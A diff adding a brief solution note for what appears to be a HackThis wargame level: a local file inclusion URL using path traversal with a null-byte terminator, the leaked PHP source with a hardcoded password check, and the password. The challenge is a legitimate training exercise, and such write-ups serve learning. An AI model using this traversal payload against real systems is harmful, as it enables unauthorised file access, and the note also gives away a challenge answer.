@@ -1,0 +1,9 @@
+LFI
+https://www.hackthis.co.uk/levels/extras/real/5/?p=../admin.php%00
+Source:
+if(isset($_GET['password']) ){
+        if( $_GET['password'] == 'princesslovetoast' ){
+                header("Location: /levels/real/5?p=princesslovetoast");
+        }
+}
+pass: princesslovetoast
